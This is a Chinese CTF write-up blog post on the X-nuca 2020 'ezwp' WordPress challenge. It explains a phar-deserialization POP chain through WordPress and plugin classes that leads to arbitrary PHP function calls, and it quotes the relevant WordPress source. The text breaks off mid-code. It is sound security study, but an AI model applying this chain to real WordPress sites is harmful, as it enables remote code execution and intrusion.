<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 5.4.2">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
  <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.css">
  <link rel="stylesheet" href="/lib/pace/pace-theme-minimal.min.css">
  <script src="/lib/pace/pace.min.js"></script>

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"srpopty.github.io","root":"/","scheme":"Muse","version":"7.7.2","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":"mac"},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":true,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
  </script>

  <meta name="description" content="X-nuca 2020 Web challenge ezwp writeup.">
<meta property="og:type" content="article">
<meta property="og:title" content="X-nuca 2020 ezwp Writeup">
<meta property="og:url" content="https://srpopty.github.io/2020/12/10/XNUCA2020-ezwp-Writeup/index.html">
<meta property="og:site_name" content="Shadow Gallery">
<meta property="og:description" content="X-nuca 2020 Web challenge ezwp writeup.">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://srpopty.github.io/2020/12/10/XNUCA2020-ezwp-Writeup/1.png">
<meta property="og:image" content="https://srpopty.github.io/2020/12/10/XNUCA2020-ezwp-Writeup/2.png">
<meta property="og:image" content="https://srpopty.github.io/2020/12/10/XNUCA2020-ezwp-Writeup/3.png">
<meta property="og:image" content="https://srpopty.github.io/2020/12/10/XNUCA2020-ezwp-Writeup/4.png">
<meta property="og:image" content="https://srpopty.github.io/2020/12/10/XNUCA2020-ezwp-Writeup/5.png">
<meta property="og:image" content="https://srpopty.github.io/2020/12/10/XNUCA2020-ezwp-Writeup/7.png">
<meta property="og:image" content="https://srpopty.github.io/2020/12/10/XNUCA2020-ezwp-Writeup/6.png">
<meta property="article:published_time" content="2020-12-10T06:26:15.000Z">
<meta property="article:modified_time" content="2020-12-10T06:26:15.000Z">
<meta property="article:author" content="Srpopty">
<meta property="article:tag" content="WriteUp">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://srpopty.github.io/2020/12/10/XNUCA2020-ezwp-Writeup/1.png">

<link rel="canonical" href="https://srpopty.github.io/2020/12/10/XNUCA2020-ezwp-Writeup/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : false,
    isPost : true
  };
</script>

  <title>X-nuca 2020 ezwp Writeup | Shadow Gallery</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

<link rel="alternate" href="/atom.xml" title="Shadow Gallery" type="application/atom+xml"><!-- hexo-inject:begin --><!-- hexo-inject:end -->
</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <!-- hexo-inject:begin --><!-- hexo-inject:end --><div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <div>
      <a href="/" class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">Shadow Gallery</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
        <p class="site-subtitle">Live in the shadow</p>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>


<nav class="site-nav">
  
  <ul id="menu" class="menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>首页</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="fa fa-fw fa-tags"></i>标签</a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-fw fa-th"></i>分类</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>归档</a>

  </li>
  </ul>

</nav>
</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>
  <div class="reading-progress-bar"></div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content">
            

  <div class="posts-expand">
      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block " lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://srpopty.github.io/2020/12/10/XNUCA2020-ezwp-Writeup/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="Srpopty">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Shadow Gallery">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          X-nuca 2020 ezwp Writeup
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2020-12-10 14:26:15" itemprop="dateCreated datePublished" datetime="2020-12-10T14:26:15+08:00">2020-12-10</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
                </span>
            </span>

          
            <div class="post-description">X-nuca 2020 Web challenge ezwp writeup.</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
        <h1 id="0x0-WordPress"><a href="#0x0-WordPress" class="headerlink" title="0x0 WordPress"></a>0x0 WordPress</h1><p> 题目直接给了一个 WordPress 的整站，题目附件除了源码还很贴心的给了数据库，在本地搭建好环境以后就可以调试了。先是用 wpscan 扫描一下，发现除了 Contact-Form-7 插件，整个站包括 wordpress 都是最新版，从数据库中可以看到有一个 admin 的管理员用户，但是并没有给出 admin 的密码，一般来说题目是不会让你去爆破管理员密码的，所以题目肯定是需要注册一个低等级账号进行提权。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">--</span><br><span class="line">-- Dumping data for table `wp_users`</span><br><span class="line">--</span><br><span class="line"></span><br><span class="line">LOCK TABLES `wp_users` WRITE;</span><br><span class="line">/*!40000 ALTER TABLE `wp_users` DISABLE KEYS */;</span><br><span class="line">INSERT INTO `wp_users` VALUES (1,&#x27;admin&#x27;,&#x27;&#x27;,&#x27;admin&#x27;,&#x27;admin@qq.com&#x27;,&#x27;http://192.168.248.151&#x27;,&#x27;2020-12-05 09:10:11&#x27;,&#x27;&#x27;,0,&#x27;admin&#x27;);</span><br><span class="line">/*!40000 ALTER TABLE `wp_users` ENABLE KEYS */;</span><br><span class="line">UNLOCK TABLES;</span><br></pre></td></tr></table></figure>



<p> 再看过期的 Contact-Foem-7 插件，它的版本是 5.0.3，而最新版已经是 5.3.1，5.0.3 版本是存在漏洞的，所以题目的预期解应该是需要利用该插件去提权，但是在比赛中并没有完全利用成功，而是使用了另一种非预期解反序列化执行命令拿到了 flag，关于 Contact-Foem-7 插件的利用，将在 0x6 节中详细分析。</p>
<h1 id="0x1-Unserialize-POP-Chain"><a href="#0x1-Unserialize-POP-Chain" class="headerlink" title="0x1 Unserialize POP Chain"></a>0x1 Unserialize POP Chain</h1><p> 题目最终的目的是执行命令，运行根目录下的 readflag 程序获取 flag，所以首先就需要找到一个可以执行任意命令或者代码的地方。在文件 FilteredIterator.php 中有一个 Requests_Utility_FilteredIterator 类，该类继承自数组迭代器，在 current 方法中会执行 <code>call_user_func ($this-&gt;callback, $value);</code>，这看起来是一个非常漂亮的执行 php 代码的地方，只要可以控制该类的 data 与 callback 成员变量，就可以执行任意数量参数的 php 函数。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//wp-includes/Requests/Utility/FilteredIterator.php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Requests_Utility_FilteredIterator</span> <span class="keyword">extends</span> <span class="title">ArrayIterator</span> </span>&#123;</span><br><span class="line">	<span class="comment">/**</span></span><br><span class="line"><span class="comment">	 * Callback to run as a filter</span></span><br><span class="line"><span class="comment">	 *</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@var</span> callable</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">protected</span> <span class="variable">$callback</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/**</span></span><br><span class="line"><span class="comment">	 * Create a new iterator</span></span><br><span class="line"><span class="comment">	 *</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@param</span> array $data</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@param</span> callable $callback Callback to be called on each value</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$data</span>, <span class="variable">$callback</span></span>) </span>&#123;</span><br><span class="line">		<span class="built_in">parent</span>::<span class="title function_ invoke__">__construct</span>(<span class="variable">$data</span>);</span><br><span class="line"></span><br><span class="line">		<span class="variable language_">$this</span>-&gt;callback = <span class="variable">$callback</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/**</span></span><br><span class="line"><span class="comment">	 * Get the current item&#x27;s value after filtering</span></span><br><span class="line"><span class="comment">	 *</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@return</span> string</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">current</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">		<span class="variable">$value</span> = <span class="built_in">parent</span>::<span class="title function_ invoke__">current</span>();</span><br><span class="line">		<span class="variable">$value</span> = <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$this</span>-&gt;callback, <span class="variable">$value</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="variable">$value</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p> 在 php 中迭代器主要在 foreach 中使用（例如 php 的原生数组 Array 类），当一个迭代器在 foreach 中开始迭代的时候，每次迭代都将会调用 current 函数以返回一个迭代器中存储的对象，所以只需要对 Requests_Utility_FilteredIterator 类进行迭代就可以自动触发 call_user_func。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;a&#x27;</span>=&gt;<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;b&#x27;</span>=&gt;<span class="string">&#x27;2&#x27;</span>);</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$arr</span> <span class="keyword">as</span> <span class="variable">$k</span>=&gt;<span class="variable">$v</span>)&#123;</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p> 所以下一步就是需要找到一个魔术方法，该魔术方法中会对自身的某一个成员变量进行 foreach 迭代。对于魔术方法的寻找，很多人可能喜欢去寻找 __wakeup 或者 __toString，但是其实最佳的目标就是构造函数 __construct 和析构函数 __destruct，这两个函数会经常在各种类中出现，而且触发方式非常简单，经过长时间的寻找，很幸运，在插件 all-in-one-event-calendar 中就存在 Ai1ec_Shutdown_Controller 类的析构函数，该析构函数中会对 $this-&gt;_preserve 遍历进行迭代。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//wp-content/plugins/all-in-one-event-calendar/app/controller/shutdown.php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Ai1ec_Shutdown_Controller</span> </span>&#123;</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="comment">//replace globals from our internal store</span></span><br><span class="line">            <span class="variable">$restore</span> = <span class="keyword">array</span>();</span><br><span class="line">            <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;_preserve <span class="keyword">as</span> <span class="variable">$name</span> =&gt; <span class="variable">$class</span> ) &#123;</span><br><span class="line">                <span class="comment">//...</span></span><br><span class="line">            &#125;</span><br><span class="line">        <span class="comment">//...</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p> 至此，我们找到了一个可以成功触发反序列化的 POP 链：对 Ai1ec_Shutdown_Controller 类进行序列化，该类的 _preserve 变量需要设置为一个 Requests_Utility_FilteredIterator 类，这个类中的 callback 与 value 组合就可以执行任意 php 函数。</p>
<h1 id="0x2-Exploit-Chain"><a href="#0x2-Exploit-Chain" class="headerlink" title="0x2  Exploit Chain"></a>0x2  Exploit Chain</h1><p> 利用上节中构造的 POP 链，就可以利用反序列化执行任意 php 函数，但是接下来还需要找到一个地方可以触发反序列化，在 WordPress 中直接利用 unserialize 函数进行反序列化可能性不大，但是 WordPress 中是可以上传文件的，我们可以上传一个 Phar 文件，最后利用 phar 伪协议即可触发 POP 链。</p>
<p> 最开始我们需要找到一个可以触发伪协议的地方，Phar 伪协议的触发需要使用 php 文件系统函数，如下所示第 27 行的 file_exists 函数看起来是一个很好的选择。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//wp-includes/post.php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Retrieve thumbnail for an attachment.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@since</span> 2.1.0</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> int $post_id Optional. Attachment ID. Default 0.</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> string|false False on failure. Thumbnail file path on success.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">wp_get_attachment_thumb_file</span>(<span class="params"> <span class="variable">$post_id</span> = <span class="number">0</span> </span>) </span>&#123;</span><br><span class="line">	<span class="variable">$post_id</span> = (<span class="keyword">int</span>) <span class="variable">$post_id</span>;</span><br><span class="line">	<span class="variable">$post</span>    = <span class="title function_ invoke__">get_post</span>(<span class="variable">$post_id</span> );</span><br><span class="line">	<span class="keyword">if</span> (! <span class="variable">$post</span> ) &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="variable">$imagedata</span> = <span class="title function_ invoke__">wp_get_attachment_metadata</span>(<span class="variable">$post</span>-&gt;ID );</span><br><span class="line">	<span class="keyword">if</span> (! <span class="title function_ invoke__">is_array</span>(<span class="variable">$imagedata</span> ) ) &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="variable">$file</span> = <span class="title function_ invoke__">get_attached_file</span>(<span class="variable">$post</span>-&gt;ID );</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (! <span class="keyword">empty</span>(<span class="variable">$imagedata</span>[<span class="string">&#x27;thumb&#x27;</span>] ) ) &#123;</span><br><span class="line">		<span class="variable">$thumbfile</span> = <span class="title function_ invoke__">str_replace</span>(<span class="title function_ invoke__">basename</span>(<span class="variable">$file</span> ), <span class="variable">$imagedata</span>[<span class="string">&#x27;thumb&#x27;</span>], <span class="variable">$file</span> );</span><br><span class="line">		<span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(<span class="variable">$thumbfile</span> ) ) &#123;</span><br><span class="line">			<span class="comment">/**</span></span><br><span class="line"><span class="comment">			 * Filters the attachment thumbnail file path.</span></span><br><span class="line"><span class="comment">			 *</span></span><br><span class="line"><span class="comment">			 * <span class="doctag">@since</span> 2.1.0</span></span><br><span class="line"><span class="comment">			 *</span></span><br><span class="line"><span class="comment">			 * <span class="doctag">@param</span> string $thumbfile File path to the attachment thumbnail.</span></span><br><span class="line"><span class="comment">			 * <span class="doctag">@param</span> int    $post_id   Attachment ID.</span></span><br><span class="line"><span class="comment">			 */</span></span><br><span class="line">			<span class="keyword">return</span> <span class="title function_ invoke__">apply_filters</span>(<span class="string">&#x27;wp_get_attachment_thumb_file&#x27;</span>, <span class="variable">$thumbfile</span>, <span class="variable">$post</span>-&gt;ID );</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p> 我们需要使 thumbfile 的值可控，可以看到 thumbfile 的值是从 file 与 imagedata 来的，再看 get_attached_file 函数。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//wp-includes/post.php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Retrieve attached file path based on attachment ID.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * By default the path will go through the &#x27;get_attached_file&#x27; filter, but</span></span><br><span class="line"><span class="comment"> * passing a true to the $unfiltered argument of get_attached_file () will</span></span><br><span class="line"><span class="comment"> * return the file path unfiltered.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * The function works by getting the single post meta name, named</span></span><br><span class="line"><span class="comment"> * &#x27;_wp_attached_file&#x27; and returning it. This is a convenience function to</span></span><br><span class="line"><span class="comment"> * prevent looking up the meta name and provide a mechanism for sending the</span></span><br><span class="line"><span class="comment"> * attached filename through a filter.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@since</span> 2.0.0</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> int  $attachment_id Attachment ID.</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> bool $unfiltered    Optional. Whether to apply filters. Default false.</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> string|false The file path to where the attached file should be, false otherwise.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_attached_file</span>(<span class="params"> <span class="variable">$attachment_id</span>, <span class="variable">$unfiltered</span> = <span class="literal">false</span> </span>) </span>&#123;</span><br><span class="line">	<span class="variable">$file</span> = <span class="title function_ invoke__">get_post_meta</span>(<span class="variable">$attachment_id</span>, <span class="string">&#x27;_wp_attached_file&#x27;</span>, <span class="literal">true</span> );</span><br><span class="line"></span><br><span class="line">	<span class="comment">// If the file is relative, prepend upload dir.</span></span><br><span class="line">	<span class="keyword">if</span> (<span class="variable">$file</span> &amp;&amp; <span class="number">0</span> !== <span class="title function_ invoke__">strpos</span>(<span class="variable">$file</span>, <span class="string">&#x27;/&#x27;</span> ) &amp;&amp; ! <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;|^.:\\\|&#x27;</span>, <span class="variable">$file</span> ) ) &#123;</span><br><span class="line">		<span class="variable">$uploads</span> = <span class="title function_ invoke__">wp_get_upload_dir</span>();</span><br><span class="line">		<span class="keyword">if</span> (<span class="literal">false</span> === <span class="variable">$uploads</span>[<span class="string">&#x27;error&#x27;</span>] ) &#123;</span><br><span class="line">			<span class="variable">$file</span> = <span class="variable">$uploads</span>[<span class="string">&#x27;basedir&#x27;</span>] . <span class="string">&quot;/<span class="subst">$file</span>&quot;</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (<span class="variable">$unfiltered</span> ) &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="variable">$file</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/**</span></span><br><span class="line"><span class="comment">	 * Filters the attached file based on the given ID.</span></span><br><span class="line"><span class="comment">	 *</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@since</span> 2.1.0</span></span><br><span class="line"><span class="comment">	 *</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@param</span> string|false $file          The file path to where the attached file should be, false otherwise.</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@param</span> int          $attachment_id Attachment ID.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">return</span> <span class="title function_ invoke__">apply_filters</span>(<span class="string">&#x27;get_attached_file&#x27;</span>, <span class="variable">$file</span>, <span class="variable">$attachment_id</span> );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p> 这个函数首先从数据库中 _wp_attached_file 字段读取附件路径，而 _wp_attached_file 是我们可以控制的，具体的控制方法会在后文中提到，控制了 file 以后不能让程序流程进入 25 行的 if 中，否则会在 file 前面拼接上传目录，导致 file 只能部分可控。</p>
<p> 再看 wp_get_attachment_thumb_file 函数中完全控制 thumbfile 的条件是 <code>str_replace (basename ( $file), $imagedata [&#39;thumb&#39;], $file )</code>，如果 basename (file) 和 file 的值相同，那么该语句就会直接返回 imagedata [‘thumb’]，需要注意的是站点运行在 Linux 上，如果输入的 file 是一个 Windows 下的路径例如 <code>Z:\Z</code>，就可以满足正则，从而不会进入到 if 中，而外面的 basename 就会将其当作一个目录，直接返回 file（假如站点运行在 Windows 上，basename 会返回 “Z”，Linux 下直接返回 “Z:\Z”）。</p>
<p> 再看 imagedata 是怎么来的。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//wp-includes/post.php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Retrieves attachment metadata for attachment ID.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@since</span> 2.1.0</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> int  $attachment_id Attachment post ID. Defaults to global $post.</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> bool $unfiltered    Optional. If true, filters are not run. Default false.</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> array|false &#123;</span></span><br><span class="line"><span class="comment"> *     Attachment metadata. False on failure.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *     <span class="doctag">@type</span> int    $width      The width of the attachment.</span></span><br><span class="line"><span class="comment"> *     <span class="doctag">@type</span> int    $height     The height of the attachment.</span></span><br><span class="line"><span class="comment"> *     <span class="doctag">@type</span> string $file       The file path relative to `wp-content/uploads`.</span></span><br><span class="line"><span class="comment"> *     <span class="doctag">@type</span> array  $sizes      Keys are size slugs, each value is an array containing</span></span><br><span class="line"><span class="comment"> *                              &#x27;file&#x27;, &#x27;width&#x27;, &#x27;height&#x27;, and &#x27;mime-type&#x27;.</span></span><br><span class="line"><span class="comment"> *     <span class="doctag">@type</span> array  $image_meta Image metadata.</span></span><br><span class="line"><span class="comment"> * &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">wp_get_attachment_metadata</span>(<span class="params"> <span class="variable">$attachment_id</span> = <span class="number">0</span>, <span class="variable">$unfiltered</span> = <span class="literal">false</span> </span>) </span>&#123;</span><br><span class="line">	<span class="variable">$attachment_id</span> = (<span class="keyword">int</span>) <span class="variable">$attachment_id</span>;</span><br><span class="line"></span><br><span class="line">	<span class="variable">$post</span> = <span class="title function_ invoke__">get_post</span>(<span class="variable">$attachment_id</span> 